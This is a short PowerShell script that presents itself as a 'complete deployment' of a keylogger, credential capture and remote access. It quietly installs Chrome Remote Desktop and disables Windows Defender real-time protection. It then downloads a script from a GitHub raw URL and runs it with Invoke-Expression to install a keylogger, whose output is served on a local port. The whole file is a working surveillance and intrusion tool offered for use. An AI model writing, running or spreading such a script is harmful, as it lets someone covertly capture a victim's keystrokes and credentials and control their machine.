# Complete deployment: Keylogger + Credentials + Chrome Remote Desktop

# 1. Install Chrome Remote Desktop
Write-Output "Installing Chrome Remote Desktop..."
$msiUrl = "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi"
$msiPath = "$env:TEMP\crd.msi"
Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing
Start-Process msiexec -ArgumentList "/i `"$msiPath`" /quiet /norestart REBOOT=ReallySuppress" -Wait -NoNewWindow
Remove-Item $msiPath -Force -ErrorAction SilentlyContinue

# Disable Windows Defender Real-time Protection (optional - for smoother operation)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# 2. Install Keylogger (download and run the main script)
Write-Output "Installing keylogger..."
$keyloggerUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/install-service-fixed.ps1"
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $keyloggerUrl).Content

Write-Output "Complete deployment finished!"
Write-Output "Chrome Remote Desktop: Installed"
Write-Output "Keylogger: http://localhost:8081"
